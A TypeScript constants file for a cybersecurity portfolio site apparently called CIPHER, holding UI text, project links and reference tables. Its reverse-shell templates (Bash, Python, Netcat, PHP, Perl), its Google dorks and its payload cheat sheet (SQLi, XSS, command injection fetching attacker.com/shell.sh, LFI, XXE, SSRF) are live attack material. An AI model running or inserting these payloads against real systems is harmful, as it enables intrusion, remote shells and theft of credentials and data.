
import { Language, SocialLink, ServiceItem, Vulnerability, WorkflowStep } from './types';
import { Github, Twitter, Linkedin, Youtube, ExternalLink, Hash, Shield, Terminal, Globe, Lock, Cpu, Code, Database, Wifi, Flag, Box } from 'lucide-react';
import React from 'react';

export const CREATOR_NAME = "Biruk Getachew";
export const APP_NAME = "CIPHER";

export const SOCIAL_LINKS: SocialLink[] = [
  { platform: 'Telegram', url: 'https://t.me/cipher_attacks', icon: 'send' },
  { platform: 'X (Twitter)', url: 'https://x.com/Cipher_attacks', icon: 'twitter' },
  { platform: 'YouTube', url: 'https://www.youtube.com/@cipher-attack', icon: 'youtube' },
  { platform: 'Pinterest', url: 'https://pin.it/3R6Nz', icon: 'pin' },
  { platform: 'GitHub', url: 'https://github.com/cipher-attack', icon: 'github' },
  { platform: 'LinkedIn', url: 'https://et.linkedin.com/in/cipher-attack-93582433b', icon: 'linkedin' },
];

export const PROJECTS = [
  {
    title: 'Cipher Lab',
    desc: 'Advanced cybersecurity experimental lab and testing environment.',
    link: 'https://cipher-lab-eta.vercel.app/',
    tags: ['Next.js', 'Security', 'Lab']
  },
  {
    title: 'Cipher Web',
    desc: 'The official portfolio hub and central command for Cipher operations.',
    link: 'https://cipher-attack.github.io/cipher_web/',
    tags: ['Portfolio', 'React', 'Animation']
  },
  {
    title: 'Sony Repairs',
    desc: 'Professional electronics repair service platform with booking system.',
    link: 'http://sony-repairs.netlify.app',
    tags: ['Service', 'Booking', 'UI/UX']
  },
  {
    title: 'Cipher Vectorizer',
    desc: 'A powerful tool for vector graphics processing and manipulation.',
    link: 'https://cipher-vectorizer.netlify.app/',
    tags: ['Tool', 'Graphics', 'Processing']
  },
  {
    title: 'Cipher Musics',
    desc: 'Immersive music streaming experience with custom audio visualizations.',
    link: 'https://cipher-musics.netlify.app/',
    tags: ['Audio', 'Streaming', 'App']
  }
];

export const TECH_STACK = [
  "React", "Next.js", "TypeScript", "Python", "Kali Linux", "Node.js", "TailwindCSS", "Firebase", "Docker", "Ethical Hacking"
];

// Mock Real-world Vulnerabilities for the Ticker
export const VULNERABILITIES: Vulnerability[] = [
  {
    id: 'CVE-2024-3094',
    severity: 'CRITICAL',
    score: 10.0,
    description: 'Malicious backdoor discovered in XZ Utils compression library allowing unauthorized remote access.',
    affected: 'Linux Systems (Fedora, Debian, Kali)',
    date: '2024-03-29'
  },
  {
    id: 'CVE-2024-21413',
    severity: 'CRITICAL',
    score: 9.8,
    description: 'Microsoft Outlook Moniker Link vulnerability allowing RCE without user interaction.',
    affected: 'Microsoft Office / Outlook',
    date: '2024-02-13'
  },
  {
    id: 'CVE-2024-23897',
    severity: 'HIGH',
    score: 8.6,
    description: 'Jenkins arbitrary file read vulnerability via CLI command parsing.',
    affected: 'Jenkins Server Core',
    date: '2024-01-24'
  },
  {
    id: 'CVE-2023-4863',
    severity: 'HIGH',
    score: 8.8,
    description: 'Heap buffer overflow in libwebp affecting Chrome, Firefox, and other software.',
    affected: 'Web Browsers & Image Tools',
    date: '2023-09-12'
  }
];

export const WORKFLOW_STEPS: Record<Language, WorkflowStep[]> = {
  [Language.EN]: [
    {
      id: 'recon',
      title: 'Reconnaissance',
      shortDesc: 'Gathering Intelligence',
      fullDesc: 'We employ passive and active OSINT techniques to map the attack surface. This includes DNS enumeration, employee profiling, and technology stack fingerprinting to identify potential entry points without alerting defenses.',
      icon: 'search'
    },
    {
      id: 'weaponization',
      title: 'Weaponization',
      shortDesc: 'Strategy Formulation',
      fullDesc: 'Developing custom payloads and attack vectors tailored to the specific vulnerabilities found. This phase involves creating non-signature-based exploits to bypass WAFs and intrusion detection systems.',
      icon: 'code'
    },
    {
      id: 'delivery',
      title: 'Exploitation',
      shortDesc: 'Breaching the Perimeter',
      fullDesc: 'Executing the attack to gain unauthorized access. We simulate real-world threat actors to test the resilience of your databases, authentication mechanisms, and network segmentation.',
      icon: 'terminal'
    },
    {
      id: 'reporting',
      title: 'Reporting',
      shortDesc: 'Actionable Analytics',
      fullDesc: 'Providing a comprehensive post-mortem. We deliver technical reports for engineers and executive summaries for stakeholders, detailing every risk with a prioritized remediation roadmap.',
      icon: 'file-text'
    }
  ],
  [Language.AM]: [
    {
      id: 'recon',
      title: 'ቅድመ-ጥናት (Recon)',
      shortDesc: 'መረጃ መሰብሰብ',
      fullDesc: 'የጥቃት ወለሉን ለመለካት የተለያዩ የስለላ ዘዴዎችን እንጠቀማለን። ይህ የዲኤንኤስ ጥናት፣ የሰራተኞች መረጃ እና የቴክኖሎጂ አሻራዎችን መለየትን ያካትታል።',
      icon: 'search'
    },
    {
      id: 'weaponization',
      title: 'ዝግጅት (Weaponization)',
      shortDesc: 'የጥቃት ስልት መንደፍ',
      fullDesc: 'ለተገኙት ክፍተቶች የሚሆኑ ልዩ የጥቃት መሳሪያዎችን ማዘጋጀት። ይህ ደረጃ የደህንነት መቆጣጠሪያዎችን (Firewalls) ለማለፍ የሚረዱ ልዩ ኮዶችን መጻፍን ያካትታል።',
      icon: 'code'
    },
    {
      id: 'delivery',
      title: 'ትግበራ (Exploitation)',
      shortDesc: 'ወደ ስርዓቱ መስበር',
      fullDesc: 'ያልተፈቀደ መዳረሻ ለማግኘት ጥቃቱን መፈጸም። የውሂብ ጎታዎችዎን እና የአውታረ መረብ ደህንነትን ለመፈተሽ እንደ እውነተኛ ወንጀለኛ ሆነን እንሞክራለን።',
      icon: 'terminal'
    },
    {
      id: 'reporting',
      title: 'ሪፖርት (Reporting)',
      shortDesc: 'ዝርዝር ትንታኔ',
      fullDesc: 'ሙሉ የኦዲት ሪፖርት ማቅረብ። ለኢንጂነሮች ቴክኒካዊ መረጃ፣ ለባለቤቶች ደግሞ አጠቃላይ ማብራሪያን የያዘ እና መፍትሄዎችን የሚያመላክት ሰነድ እናስረክባለን።',
      icon: 'file-text'
    }
  ]
};

export const MAGIC_BYTES = {
  'ffd8ff': 'JPEG Image',
  '89504e47': 'PNG Image',
  '47494638': 'GIF Image',
  '25504446': 'PDF Document',
  '504b0304': 'ZIP Archive (or DOCX/XLSX)',
  '1f8b': 'GZIP Archive',
  '424d': 'BMP Image',
  '494433': 'MP3 Audio',
  '7f454c46': 'ELF Executable (Linux)',
  '4d5a': 'DOS/PE Executable (Windows)'
};

export const HASH_PATTERNS = [
  { length: 32, type: 'MD5 / MD4 / MD2' },
  { length: 40, type: 'SHA-1' },
  { length: 64, type: 'SHA-256' },
  { length: 128, type: 'SHA-512' },
  { length: 56, type: 'SHA-224' },
  { length: 96, type: 'SHA-384' },
];

export const SHELL_TEMPLATES = {
  'Bash': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
  'Python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
  'Netcat': 'nc -e /bin/sh {ip} {port}',
  'Netcat (OpenBSD)': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
  'PHP': 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
  'Perl': 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
};

export const GOOGLE_DORKS = {
  'Public Files': 'site:{domain} ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv',
  'Directory Listing': 'site:{domain} intitle:index.of',
  'Config Files': 'site:{domain} ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini',
  'Database Files': 'site:{domain} ext:sql | ext:dbf | ext:mdb',
  'Log Files': 'site:{domain} ext:log',
  'Backup Files': 'site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup',
  'PHP Errors': 'site:{domain} "PHP Parse error" | "PHP Warning" | "PHP Error"'
};

export const CHEATSHEET_DATA = [
  {
    category: "SQL Injection (SQLi)",
    payloads: [
      "' OR '1'='1",
      "' OR 1=1--",
      "' UNION SELECT NULL, username, password FROM users--",
      "admin' --",
      "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)--",
      "' UNION SELECT 1, @@version, user(), 4 --",
      "1; DROP TABLE users",
      "' OR '1'='1' /*",
      "admin' #",
      "' OR 1=1 LIMIT 1 -- -",
      "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
    ]
  },
  {
    category: "Cross Site Scripting (XSS)",
    payloads: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "javascript:alert(1)",
      "'-alert(1)-'",
      "<body onload=alert('XSS')>",
      "<iframe src=\"javascript:alert(1)\"></iframe>",
      "<input onfocus=alert(1) autofocus>",
      "<select autofocus onfocus=alert(1)>",
      "<textarea autofocus onfocus=alert(1)>",
      "<keygen autofocus onfocus=alert(1)>",
      "<video><source onerror=\"alert(1)\">"
    ]
  },
  {
    category: "Remote Code Execution (RCE) / Command Injection",
    payloads: [
      "; /bin/sh",
      "| nc -e /bin/sh 10.0.0.1 1234",
      "$(whoami)",
      "`cat /etc/passwd`",
      "&& touch /tmp/pwned",
      "; id",
      "| cat /etc/shadow",
      "& ping -c 10 127.0.0.1 &",
      "; php -r 'echo \"PWNED\";'",
      "|| wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod 777 /tmp/shell.sh && /tmp/shell.sh"
    ]
  },
  {
    category: "Local File Inclusion (LFI)",
    payloads: [
      "../../../../etc/passwd",
      "../../../../windows/win.ini",
      "php://filter/convert.base64-encode/resource=index.php",
      "....//....//....//etc/passwd",
      "/var/www/html/../../../../etc/shadow",
      "file:///etc/passwd",
      "expect://id",
      "input://",
      "http://localhost/index.php?page=http://attacker.com/shell.txt"
    ]
  },
  {
    category: "XML External Entity (XXE)",
    payloads: [
      "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote;]>",
      "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
    ]
  },
  {
    category: "SSRF (Server Side Request Forgery)",
    payloads: [
      "http://127.0.0.1:80",
      "http://localhost:22",
      "http://169.254.169.254/latest/meta-data/",
      "dict://127.0.0.1:11211/",
      "file:///etc/passwd",
      "gopher://127.0.0.1:25/"
    ]
  }
];

export const PORTS_DATA = [
  { port: 21, service: 'FTP', desc: 'File Transfer Protocol' },
  { port: 22, service: 'SSH', desc: 'Secure Shell' },
  { port: 23, service: 'Telnet', desc: 'Unencrypted Text Comm' },
  { port: 25, service: 'SMTP', desc: 'Simple Mail Transfer' },
  { port: 53, service: 'DNS', desc: 'Domain Name System' },
  { port: 80, service: 'HTTP', desc: 'HyperText Transfer' },
  { port: 110, service: 'POP3', desc: 'Post Office Protocol' },
  { port: 143, service: 'IMAP', desc: 'Internet Message Access' },
  { port: 443, service: 'HTTPS', desc: 'Secure HTTP' },
  { port: 445, service: 'SMB', desc: 'Server Message Block' },
  { port: 3306, service: 'MySQL', desc: 'MySQL Database' },
  { port: 3389, service: 'RDP', desc: 'Remote Desktop' },
  { port: 5432, service: 'PostgreSQL', desc: 'Postgres Database' },
  { port: 6379, service: 'Redis', desc: 'Redis Key-Value' },
  { port: 8080, service: 'HTTP-Alt', desc: 'Web Proxy / Tomcat' }
];

export const LINUX_COMMANDS = [
  { cmd: 'ls -la', desc: 'List all files with permissions' },
  { cmd: 'chmod 755 file', desc: 'Change file permissions' },
  { cmd: 'chown user:group file', desc: 'Change ownership' },
  { cmd: 'ps aux | grep process', desc: 'Find running process' },
  { cmd: 'netstat -tulpn', desc: 'Show listening ports' },
  { cmd: 'tar -czvf archive.tar.gz dir', desc: 'Compress directory' },
  { cmd: 'grep -r "text" .', desc: 'Search text recursively' },
  { cmd: 'ssh user@host', desc: 'Remote login' },
  { cmd: 'scp file user@host:/path', desc: 'Secure copy file' },
  { cmd: 'wget url', desc: 'Download file' }
];

export const GIT_COMMANDS = [
  { cmd: 'git init', desc: 'Initialize repo' },
  { cmd: 'git clone url', desc: 'Clone repository' },
  { cmd: 'git add .', desc: 'Stage all changes' },
  { cmd: 'git commit -m "msg"', desc: 'Commit changes' },
  { cmd: 'git push origin main', desc: 'Push to remote' },
  { cmd: 'git pull', desc: 'Pull changes' },
  { cmd: 'git branch', desc: 'List branches' },
  { cmd: 'git checkout -b branch', desc: 'Create/Switch branch' },
  { cmd: 'git merge branch', desc: 'Merge branch' },
  { cmd: 'git log --oneline', desc: 'View commit history' }
];

export const HTTP_STATUS = [
  { code: 200, msg: 'OK', desc: 'Success' },
  { code: 301, msg: 'Moved Permanently', desc: 'Redirect' },
  { code: 302, msg: 'Found', desc: 'Temp Redirect' },
  { code: 400, msg: 'Bad Request', desc: 'Client Error' },
  { code: 401, msg: 'Unauthorized', desc: 'Login Required' },
  { code: 403, msg: 'Forbidden', desc: 'Access Denied' },
  { code: 404, msg: 'Not Found', desc: 'Resource missing' },
  { code: 500, msg: 'Internal Server Error', desc: 'Server Crash' },
  { code: 502, msg: 'Bad Gateway', desc: 'Upstream Error' },
  { code: 503, msg: 'Service Unavailable', desc: 'Overloaded' }
];

export const CONTENT = {
  [Language.EN]: {
    nav: {
      home: 'Home',
      services: 'Services',
      projects: 'Projects',
      tools: 'Cipher Tools',
      about: 'About',
      contact: 'Contact',
    },
    hero: {
      title: 'Securing the Digital Frontier',
      subtitle: 'Advanced cybersecurity solutions, penetration testing, and digital defense strategies designed for the modern web.',
      ctaPrimary: 'Contact Me',
      ctaSecondary: 'View Projects',
    },
    projects: {
      title: 'Featured Operations',
      subtitle: 'A selection of deployed systems and security tools.',
      visit: 'Visit Site'
    },
    tools: {
      title: 'Cipher Security Suite',
      subtitle: 'Advanced cryptographic tools, network analyzers, and forensics utilities.',
      inputPlaceholder: 'Enter data to process...',
      tabs: {
        transform: 'Transform',
        hash: 'Hashing',
        security: 'Security',
        web: 'Web',
        network: 'Network',
        forensics: 'Forensics',
        vault: 'Vault',
        ctf: 'CTF Toolkit',
        utils: 'Utils'
      },
      labels: {
        inputFormat: 'Input Format',
        strength: 'Password Strength',
        crackTime: 'Est. Crack Time'
      }
    },
    services: {
      title: 'Operational Workflow',
      subtitle: 'How we systematically deconstruct and secure your infrastructure.'
    },
    ai: {
      title: 'Cipher AI Assistant',
      placeholder: 'Ask about cybersecurity...',
      welcome: 'Hello. I am the Cipher AI. How can I assist with your security needs today?',
    },
    footer: {
      rights: 'All rights reserved.',
      builtBy: 'Built by',
    },
    cmd: {
      placeholder: 'Type a command or search...',
      actions: 'Actions',
      navigation: 'Navigation',
    }
  },
  [Language.AM]: {
    nav: {
      home: 'ዋና ገጽ',
      services: 'አገልግሎቶች',
      projects: 'ፕሮጀክቶች',
      tools: 'ሳይፈር መሳሪያዎች',
      about: 'ስለ እኛ',
      contact: 'ያግኙን',
    },
    hero: {
      title: 'የዲጂታል ድንበርን መጠበቅ',
      subtitle: 'ለዘመናዊው ድር የተነደፉ የላቀ የሳይበር ደህንነት መፍትሄዎች፣ የጥቃት ሙከራዎች እና የዲጂታል መከላከያ ስልቶች።',
      ctaPrimary: 'አግኙን',
      ctaSecondary: 'ፕሮጀክቶችን ይመልከቱ',
    },
    projects: {
      title: 'የተመረጡ ስራዎች',
      subtitle: 'በቅርቡ የተሰሩ ስርዓቶች እና የደህንነት መሳሪያዎች።',
      visit: 'ድረ-ገጹን ይጎብኙ'
    },
    tools: {
      title: 'የሳይፈር ደህንነት ስብስብ',
      subtitle: 'የላቀ የምስጠራ መሳሪያዎች፣ የኔትወርክ መመርመሪያዎች እና የፎረንሲክ መሳሪያዎች።',
      inputPlaceholder: 'ለማስኬድ ውሂብ ያስገቡ...',
      tabs: {
        transform: 'ልወጣ',
        hash: 'ሃሽ',
        security: 'ደህንነት',
        web: 'ዌብ',
        network: 'ኔትወርክ',
        forensics: 'ፎረንሲክ',
        vault: 'ካዝና',
        ctf: 'CTF መርጃ',
        utils: 'መገልገያዎች'
      },
      labels: {
        inputFormat: 'የግቤት አይነት',
        strength: 'የይለፍ ቃል ጥንካሬ',
        crackTime: 'የመገመቻ ጊዜ'
      }
    },
    services: {
      title: 'የስራ ሂደት',
      subtitle: 'የደህንነት ክፍተቶችን እንዴት በስርዓት እንደምንለይ እና እንደምንጠግን።'
    },
    ai: {
      title: 'ሳይፈር AI ረዳት',
      placeholder: 'ስለ ሳይበር ደህንነት ይጠይቁ...',
      welcome: 'ሰላም። እኔ የሳይፈር AI ነኝ። ዛሬ በደህንነት ፍላጎቶችዎ እንዴት ልርዳዎት?',
    },
    footer: {
      rights: 'መብቱ በህግ የተጠበቀ ነው።',
      builtBy: 'በ ብሩክ ጌታቸው የተሰራ',
    },
    cmd: {
      placeholder: 'ትዕዛዝ ያስገቡ...',
      actions: 'ተግባራት',
      navigation: 'መዳረሻዎች',
    }
  }
};

export const ICONS_MAP: Record<string, React.FC<any>> = {
  github: Github,
  twitter: Twitter,
  linkedin: Linkedin,
  youtube: Youtube,
  pin: Hash, 
  send: ExternalLink, 
  shield: Shield,
  terminal: Terminal,
  globe: Globe,
  lock: Lock,
  cpu: Cpu,
  code: Code,
  database: Database,
  wifi: Wifi
};
